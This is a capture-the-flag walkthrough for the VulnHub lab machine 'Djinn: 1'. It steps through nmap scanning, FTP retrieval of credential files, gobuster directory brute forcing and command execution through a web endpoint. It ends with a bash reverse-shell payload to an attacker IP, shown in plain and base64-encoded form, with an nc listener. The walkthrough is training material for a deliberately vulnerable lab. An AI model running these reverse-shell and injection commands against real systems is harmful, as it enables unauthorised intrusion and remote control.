:::::::::::::::::::::: page
# Djinn: 1 {#djinn-1 .title}

\

## 

## Djinn: 1

- **[ReadMe: 1]{style="color:#f66151;"}** :-

<!-- -->

- Download the machine : <https://www.vulnhub.com/entry/djinn-1,397/>

![](images/810-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#e01b24;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/810-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.155
:::

![](images/810-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.155
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.155    
:::

1.  [FTP Enumeration]{style="color:#e01b24;"} :

- FTP login :

::: codebox
    ftp 192.168.2.155
:::

- Check the list :

::: codebox
    ls
:::

- Download the file :

::: codebox
    get creds.txt
:::

- 

::: codebox
    get game.txt
:::

- 

::: codebox
    get message.txt
:::

![](images/810-4.png)

- Read the content of download file :

::: codebox
    cat creds.txt
:::

- 

::: codebox
    cat game.txt
:::

- 

::: codebox
    cat message.txt
:::

![](images/810-5.png)

1.  [Web Enumeration]{style="color:#e01b24;"} :

- IP visit in browser with port 7331 : <http://192.168.2.155:7331/>

<!-- -->

- Now run the gobuster for directory brute force :

::: codebox
    gobuster dir -u http://192.168.2.155:7331/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
:::

![](images/810-6.png)

- Visit the endpoints : <http://192.168.2.155:7331/wish>

![](images/810-7.png)

<http://192.168.2.155:7331/genie>

![](images/810-8.png)

- In /wish endpoint we can execute the command :

::: codebox
    id
:::

- 

::: codebox
    http://192.168.2.155:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A
:::

![](images/810-9.png) execute the command in url .

1.  [Reverse shell]{style="color:#e01b24;"} :

- Start the listener :

::: codebox
    nc -nlvp 443
:::

- Reverse shell payload :

::: codebox
    bash -c 'bash -i >& /dev/tcp/192.168.2.219/443 0>&1'
:::

![](images/810-10.png)

![](images/810-11.png) Not execute the payload .

- Encoding the Payload in base 64 :

::: codebox
    echo -n 'bash -i >& /dev/tcp/192.168.2.219/443 0>&1' | base64 -w 0
:::

![](images/810-12.png)

- Final Payload make :

::: codebox
    echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMjE5LzQ0MyAwPiYx | base64 -d | bash
:::

- Then run the payload :

![](images/810-13.png)

- After submit the payload then we get the shell :

![](images/810-14.png)
::::::::::::::::::::::
